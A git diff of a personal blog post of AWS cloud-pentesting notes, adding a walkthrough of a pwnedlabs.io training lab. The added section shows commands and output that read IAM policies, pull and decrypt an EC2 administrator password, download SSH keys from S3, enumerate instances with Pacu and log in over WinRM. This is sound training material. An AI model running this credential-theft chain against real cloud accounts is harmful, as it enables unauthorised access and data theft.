@@ -12,9 +12,7 @@ header:
 
 # Pentesting cloud environments
 
-It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I won't create any new learning material, instead I'll aggregate the best free resources I can find. Any CTFs or practical exercises I complete will be documented, along with any notes I take on theoretical material. I skipped some labs that required a bit more setup such as <a href="https://github.com/RhinoSecurityLabs/cloudgoat">CloudGoat 2.0</a> and <a href="https://github.com/ine-labs/AWSGoat">AWSGoat</a>. I cannot vouch for them but they seem like good training too. Hopefully they overlap with the other resources and I don't miss out on much.
-
-This is more or less the usual process I follow whenever I learn a new topic from online resources, only this time I'll be making it public. I'll be focusing on the cloud provider AWS.
+It seems there aren't many resources on cloud pentesting, so I decided to take matters into my own hands. I won't create any new learning material, instead I'll aggregate the best free resources I can find. Any CTFs or practical exercises I complete will be documented, along with any notes I take on theoretical material. They are not very organized, but this is meant to be a I-know-I-did-this-before-let-me-just-CTRL-F-my-notes type of resource. I skipped some labs that required a bit more setup such as <a href="https://github.com/RhinoSecurityLabs/cloudgoat">CloudGoat 2.0</a> and <a href="https://github.com/ine-labs/AWSGoat">AWSGoat</a>. I cannot vouch for them but they seem like good training too. Hopefully they overlap with the other resources and I don't miss out on much. I'll be focusing on AWS.
 
 For a slightly more readable version, read this post <a href="https://github.com/BrunoCaseiro/brunocaseiro.github.io/blob/master/_posts/2025-10-04-Testing-pens-in-heaven.md">here</a>
 
@@ -38,7 +36,6 @@ For a slightly more readable version, read this post <a href="https://github.com
   * <a href="https://hackingthe.cloud/">Hacking The Cloud</a>
   * <a href="https://cloud.hacktricks.wiki/en/index.html">HackTricks Cloud</a>
   * <a href="https://github.com/kh4sh3i/cloud-penetration-testing">kh4sh3i's Cloud pentesting cheatsheet</a>
-  * <a href="https://github.com/carnal0wnage/weirdAAL/wiki">WeirdAAAL: AWS Attack Library</a>
 
 * Tools
   * <a href="https://github.com/NetSPI/aws_consoler">AWS Consoler: Convert CLI credentials into console access</a>
@@ -995,7 +992,7 @@ And we get the final flag/URL at http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb
 
 ## pwnedlabs.io
 
-Most stuff here is paid, but the free labs are pretty good, I'd definitely recommend them. I filtered by Red Team, AWS and Free and completed them all. It goes a bit more in depth than both flaws.cloud and covers some other service-specific vulnerabilities, so go ahead and try them out! Each lab has a thorough walkthrough so I won't bother with that, but I'll still leave some notes for myself in this section.
+Most stuff here is paid, but the free labs are pretty good, I'd definitely recommend them. I filtered by Red Team, AWS and Free and completed them all. It goes a bit more in depth than both flaws.cloud and covers some other service-specific vulnerabilities, so go ahead and try them out! Each lab has a thorough walkthrough so I won't bother with that, but I'll still leave some scattered notes in this section.
 
 <br>
 
@@ -1024,6 +1021,8 @@ Content-Type: application/xml
 Transfer-Encoding: chunked
 Server: AmazonS3
 ```
+
+--- 
 
 You can copy S3 files to the local system without using a browser
 ```
@@ -1214,12 +1213,133 @@ And to call that action
 <snip>
 ```
 
+--- 
+
+The syntax is very similar from service to service, so it's fairly easy to invoke an action after finding we have permission for it. Another example...
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Policy --version-id v4
+{
+    "PolicyVersion": {
+        "Document": {
+            "Version": "2012-10-17",
+            "Statement": [
+                {
+                    "Sid": "VisualEditor0",
+                    "Effect": "Allow",
+                    "Action": "ec2:DescribeInstances",
+                    "Resource": "*"
+                },
+                {
+                    "Sid": "VisualEditor1",
+                    "Effect": "Allow",
+                    "Action": "ec2:GetPasswordData",
+                    "Resource": "arn:aws:ec2:us-east-1:427648302155:instance/i-04cc1c2c7ec1af1b5"
+                },
+                {
+                    "Sid": "VisualEditor2",
+                    "Effect": "Allow",
+                    "Action": [
+                        "iam:GetPolicyVersion",
+                        "iam:GetPolicy",
+                        "iam:GetUserPolicy",
+                        "iam:ListAttachedUserPolicies",
+                        "s3:GetBucketPolicy"
+                    ],
+                    "Resource": [
+                        "arn:aws:iam::427648302155:user/contractor",
+                        "arn:aws:iam::427648302155:policy/Policy",
+                        "arn:aws:s3:::hl-it-admin"
+                    ]
+                }
+            ]
+        },
+        "VersionId": "v4",
+        "IsDefaultVersion": true,
+        "CreateDate": "2023-07-28T14:24:22+00:00"
+    }
+}
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5
+{
+    "InstanceId": "i-04cc1c2c7ec1af1b5",
+    "Timestamp": "2024-12-01T07:51:43+00:00",
+    "PasswordData": "s2QgAyMRT/OAjxv2F5FKSaco4lISg4kS+LTajSjr9eTHaKE0AdX0u7AaLzicaHV9Ki2Ue4OduBIxRPuwmzWHyUR/ZNgaIZIPCuh2XMDs4kUmvrJFZkU22WqpYQ16AUbJAvwVfNWew7nIpWpRLNB2WUom43vofSPPh3a6+xsDewgQmV0rZ/caDsfcIKASojoQ2tWpKxlz7vlUsyciDE1nuFfuOo5p5E27lWGrcyHzigHh3ErsSKq5lqQI7i2Fry0FSVowb+lXv8DVwjq5oSVP6ibrRPWqCsKWJadYg2engXL8c8vD2imPtc6wOa2wCx1CTV+9IyIKhJEE2yADo5B+Cw=="
+}
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3api get-bucket-policy --bucket hl-it-admin
+{
+    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::427648302155:user/contractor\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::hl-it-admin/ssh_keys/ssh_keys_backup.zip\"}]}"
+}
+                                                                                                                    
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3 cp s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip . 
+download: s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip to ./ssh_keys_backup.zip
+```
+
+With access to SSH keys, EC2's describe instances can give a hint to where they can be used. Let's use Pacu's ec2__enum
+```
+Pacu (contractor:contractor) > run ec2__enum
+  Running module ec2__enum...
+Automatically targeting regions:
+  ap-northeast-1
+  eu-central-1
+  eu-north-1
+<snip>
+[ec2__enum] Starting region us-east-1...
+[ec2__enum]   3 instance(s) found.
+[ec2__enum] FAILURE: 
+[ec2__enum]   Access denied to DescribeSecurityGroups.
+[ec2__enum]     Skipping security group enumeration...
+[ec2__enum]   0 security groups(s) found.
+[ec2__enum] FAILURE: 
+[ec2__enum]   Access denied to DescribeAddresses.
+[ec2__enum]     Skipping elastic IP enumeration...
+[ec2__enum]   0 elastic IP address(es) found.
+[ec2__enum]   2 public IP address(es) found and added to text file located at: ~/.local/share/pacu/contractor/downloads/ec2_public_ips_contractor_us-east-1.txt
+<snip>
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat ~/.local/share/pacu/contractor/downloads/ec2_public_ips_contractor_us-east-1.txt
+54.226.75.125
+52.0.51.234
+```
+
+After an nmap scan, 54.226.75.125 has port 5985 open (WinRM). With it-admin's launch key, request its password with
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --priv-launch-key it-admin.pem
+{
+    "InstanceId": "i-04cc1c2c7ec1af1b5",
+    "Timestamp": "2024-12-01T07:51:43.000Z",
+    "PasswordData": "UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!"
+}
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ evil-winrm -i 54.226.75.125 -u administrator
+Enter Password:
+<snip>
+
+*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\n    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException\n    + 
+```
+
+After lots of troubleshooting and attempting to escape a restricted shell, I just decided to use crackmapexec. Combine Windows post-exploitation skills to loot for credentials and exploit the local machine further.
+
+--- 
+
+
+
+
+
 
 
 
 
 
 <br>
+
 
 ## HTB Fortress: AWS
 
